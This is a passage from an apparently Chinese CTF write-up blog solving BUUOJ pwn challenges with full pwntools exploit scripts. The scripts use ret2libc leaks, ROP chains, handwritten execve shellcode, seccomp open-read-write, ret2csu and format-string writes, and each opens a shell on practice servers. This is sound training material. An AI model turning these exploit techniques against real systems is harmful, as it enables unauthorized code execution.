class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;info:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0.Exit\n:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="13-others-shellcode"><a href="#13-others-shellcode" class="headerlink" title="13.others_shellcode"></a>13.others_shellcode</h1><p>….这个题就离谱</p><h1 id="14-铁人三项-第五赛区-2018-rop"><a href="#14-铁人三项-第五赛区-2018-rop" class="headerlink" title="14.铁人三项(第五赛区)_2018_rop"></a>14.铁人三项(第五赛区)_2018_rop</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9_2018_rop">铁人三项(第五赛区)_2018_rop</a></p><p><img src="https://i.loli.net/2021/06/15/lBDTcv3Rjtuh64E.png" alt="image-20210615184408096"></p><p>懒得写题解了，就是简单的libc泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29307</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;2018_rop&quot;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x80484C6</span></span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>))</span><br><span class="line">write=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;write&quot;</span>,write)</span><br><span class="line">libc_base=write-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="15-bjdctf-2020-babyrop"><a href="#15-bjdctf-2020-babyrop" class="headerlink" title="15.bjdctf_2020_babyrop"></a>15.bjdctf_2020_babyrop</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/bjdctf_2020_babyrop">bjdctf_2020_babyrop</a></p><p>上题是32位的，这个题是64位的。别的好像没啥大区别。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28535</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;bjdctf_2020_babyrop&quot;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln=<span class="number">0x40067D</span></span><br><span class="line">pop_rdi=<span class="number">0x400733</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln))</span><br><span class="line">puts=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts)</span><br><span class="line">libc_base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="16-qctf-2018-stack2"><a href="#16-qctf-2018-stack2" class="headerlink" title="16.qctf_2018_stack2"></a>16.qctf_2018_stack2</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/QCTF_2018_stack2">qctf_2018_stack2</a></p><p>漏洞在这，没检查数组边界，通过后门函数拿shell就行。</p><p><img src="https://i.loli.net/2021/06/15/T8GzZW6UQkYchti.png" alt="image-20210615215548848"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; p32(0x0804859B)</span><br><span class="line">b<span class="string">&#x27;\x9b\x85\x04\x08&#x27;</span></span><br></pre></td></tr></table></figure><p>另外直接打是没办法打通的，因为返回地址的偏移不是0x70，还需要多偏移0x10的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea ecx, [esp+4]把返回地址+4存到ecx</span><br><span class="line">and esp, 0FFFFFFF0h 把esp低四位归0</span><br><span class="line">push [ecx-4]把返回地址压入栈</span><br></pre></td></tr></table></figure><p>具体返回位置通过调试可得知</p><p><img src="https://i.loli.net/2021/06/15/9nwlhyriR6e5CJQ.png" alt="image-20210615232639509"></p><p><img src="https://i.loli.net/2021/06/15/oLyxFMmiK1APwEt.png" alt="image-20210615225535917"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29883</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;have:\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;numbers\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;change:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">116</span>+<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;number:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x9b</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;change:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">117</span>+<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;number:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x85</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;change:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">118</span>+<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;number:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x04</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;change:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">119</span>+<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;number:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x08</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="17-ciscn-2019-s-9"><a href="#17-ciscn-2019-s-9" class="headerlink" title="17.ciscn_2019_s_9"></a>17.ciscn_2019_s_9</h1><p><img src="https://i.loli.net/2021/09/04/oEWvdD8HLfrVl59.png" alt="image-20210904125615917"></p><p>堆栈可执行</p><p>主要逻辑函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">24</span>]; <span class="comment">// [esp+8h] [ebp-20h]</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nHey! ^_^&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nIt&#x27;s nice to meet you&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nDo you have anything to tell?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK bye~&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/04/4fvB5bqMKCSWAZT.png" alt="image-20210904121743119"></p><p>通过代码可以看出，<code>fgets</code>处可以溢出，但是直接用pwntools的shellcode，会太长。</p><p><img src="https://i.loli.net/2021/09/04/mVdpBYXWFAlGOIe.png" alt="image-20210904125203056"></p><p>这样就远超0x24了，不能覆盖返回地址，所以我们手写shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27905</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x0068732f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov al, 0xb</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">hint_addr=<span class="number">0x8048554</span></span><br><span class="line">payload=asm(shellcode).ljust(<span class="number">0x24</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(hint_addr)+asm(<span class="string">&#x27;sub esp,0x28 ; call esp&#x27;</span>)</span><br><span class="line">p.recvuntile(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="18-mrctf2020-shellcode"><a href="#18-mrctf2020-shellcode" class="headerlink" title="18.mrctf2020_shellcode"></a>18.mrctf2020_shellcode</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@330fb4af763b:~<span class="comment"># checksec mrctf2020_shellcode</span></span><br><span class="line">[*] <span class="string">&#x27;/root/mrctf2020_shellcode&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>堆栈可执行</p><p><img src="https://i.loli.net/2021/09/04/BK2jGCyEHNRc3PZ.png" alt="image-20210904132327616"></p><p><img src="https://i.loli.net/2021/09/04/i4lwhXIfUeyda72.png" alt="image-20210904132350553"></p><p>因为有个<code>call rax</code>，是不确定地址，所以不能反汇编。</p><p>核心逻辑就是读取一段数据，然后执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26281</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">payload=asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="19-pwnable-orw"><a href="#19-pwnable-orw" class="headerlink" title="19.pwnable_orw"></a>19.pwnable_orw</h1><p><img src="https://i.loli.net/2021/09/04/BcEuOr52JQdvL6K.png" alt="image-20210904184417701"></p><p>seccomp开了沙箱保护，只能调用如下的系统函数</p><p><img src="https://i.loli.net/2021/09/04/7aRCw2ZcoPsYJK9.png" alt="image-20210904190625721"></p><p><img src="https://i.loli.net/2021/09/04/6cA4BOEgWfrHvwI.png" alt="image-20210904191623797"></p><p>然后是找到可读可写的段</p><p><img src="https://i.loli.net/2021/09/04/TAnhzG36iFl98oe.png" alt="image-20210904192215556"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27067</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">payload+=shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;0x0804A065&#x27;</span>,<span class="number">70</span>)</span><br><span class="line">payload+=shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;0x0804A065&#x27;</span>,<span class="number">70</span>)</span><br><span class="line">payload=asm(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;shellcode:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>使用open打开的fd一般等于3，所以read的fd是3，将flag的内容读入buf。而输出的fd一般是1，这个不需要使用open的fd，所以write的fp使用3。</p><h1 id="20-bjdctf-2020-babystack2"><a href="#20-bjdctf-2020-babystack2" class="headerlink" title="20.bjdctf_2020_babystack2"></a>20.bjdctf_2020_babystack2</h1><p><img src="https://i.loli.net/2021/09/04/yglWUCRTZj4SIrX.png" alt="image-20210904220750043"></p><p>堆栈不可执行</p><p><img src="https://i.loli.net/2021/09/04/KZAUwpvFbRsHJuG.png" alt="image-20210904220924015"></p><p>输入-1使整数溢出，然后直接后门函数覆盖返回地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25413</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">backdoor=<span class="number">0x400726</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="21-HarekazeCTF2019-baby-rop2"><a href="#21-HarekazeCTF2019-baby-rop2" class="headerlink" title="21.[HarekazeCTF2019]baby_rop2"></a>21.[HarekazeCTF2019]baby_rop2</h1><p><img src="https://i.loli.net/2021/09/06/34DZlBfYXk2NQWc.png" alt="image-20210906090212077"></p><p>开启堆栈不可执行</p><p><img src="https://i.loli.net/2021/09/06/lFsmEY9AcNytT2a.png" alt="image-20210906090253701"></p><p>直接进行rop攻击即可，查询字符串没找到system等函数。所以使用read函数的libc泄漏出system函数的真正地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27542</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./babyrop2&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x400733</span></span><br><span class="line">pop_rsi=<span class="number">0x400731</span></span><br><span class="line">format_addr=<span class="number">0x400770</span></span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt=<span class="number">0x400636</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main_plt)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">read_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base=read_addr-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload2=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)+p64(main_plt)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里有个问题是，<code>printf</code>函数不需要两个参数，只需要一个参数就能输出<code>read</code>的got地址。这里是因为<code>printf</code>和<code>puts</code>是常用的输出函数，在<code>printf</code>的参数是以<code>\n</code>结束的纯字符串时，<code>printf</code>会被优化为<code>puts</code>函数并去除换行符。</p><h1 id="22-jarvisoj-level3"><a href="#22-jarvisoj-level3" class="headerlink" title="22.jarvisoj_level3"></a>22.jarvisoj_level3</h1><p><img src="https://i.loli.net/2021/09/06/GlVqbZvNcwXiKfH.png" alt="image-20210906092123487"></p><p>堆栈不可执行</p><p><img src="https://i.loli.net/2021/09/06/mbSv75g1yRLx32O.png" alt="image-20210906092447884"></p><p>核心逻辑，能够造成溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26019</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vulnerable_function=<span class="number">0x804844B</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(vulnerable_function)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write=u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(write)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line">base=write-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(vulnerable_function)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="23-ciscn-2019-s-3"><a href="#23-ciscn-2019-s-3" class="headerlink" title="23.ciscn_2019_s_3"></a>23.ciscn_2019_s_3</h1><p><img src="https://i.loli.net/2021/09/06/fiBbhIpYWUzDmqF.png" alt="image-20210906095408255"></p><p><img src="https://i.loli.net/2021/09/18/Ch3MTQluzW4aovi.png" alt="image-20210918165628547.png"></p><p>通过gdb调试和ida可以发现buf为0x10，因为函数调用完之后直接retn，所以返回地址就是rbp</p><p><img src="https://i.loli.net/2021/09/18/KmAZTFN5Gcsf4yh.png" alt="image-20210918175306297.png"></p><p>这个地址可以计算出我们写入的/bin/sh的偏移位。0x3b8-0x290=0x128</p><p><img src="https://i.loli.net/2021/09/18/Qi7ESq1pjyLcCuD.png" alt="image-20210918230614889.png"></p><p>最后因为找不到<code>pop rdx</code>，所以需要使用ret2csu进行巧妙构造一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27697</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./ciscn_s_3&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b main&#x27;)</span></span><br><span class="line">execve_addr=<span class="number">0x4004E2</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">vuln_addr=<span class="number">0x4004ED</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4005a1</span></span><br><span class="line">syscall=<span class="number">0x400501</span></span><br><span class="line">csu_1=<span class="number">0x400580</span></span><br><span class="line">p6r=<span class="number">0x40059A</span></span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">binsh = u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">0x118</span></span><br><span class="line">log.success(<span class="string">&#x27;binsh = &#x27;</span> + <span class="built_in">hex</span>(binsh))</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(p6r)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(binsh+<span class="number">0x58</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(csu_1)+p64(execve_addr)+p64(pop_rdi)+p64(binsh)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="24-jarvisoj-fm"><a href="#24-jarvisoj-fm" class="headerlink" title="24.jarvisoj_fm"></a>24.jarvisoj_fm</h1><p><img src="https://i.loli.net/2021/09/20/VtlKgJfEPnrMdQz.png" alt="image-20210920204312169.png"></p><p><img src="https://i.loli.net/2021/09/20/R6Q1hIDwxGAbszT.png" alt="image-20210920210140405.png"></p><p>格式化字符串，两个解法</p><p>一个是让x等于4，另一个是把printf函数的got地址变成<code>system(&quot;/bin/sh&quot;)</code>的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27627</span>)</span><br><span class="line">payload = p32(<span class="number">0x804A02C</span>)+<span class="string">b&quot;%11$n&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 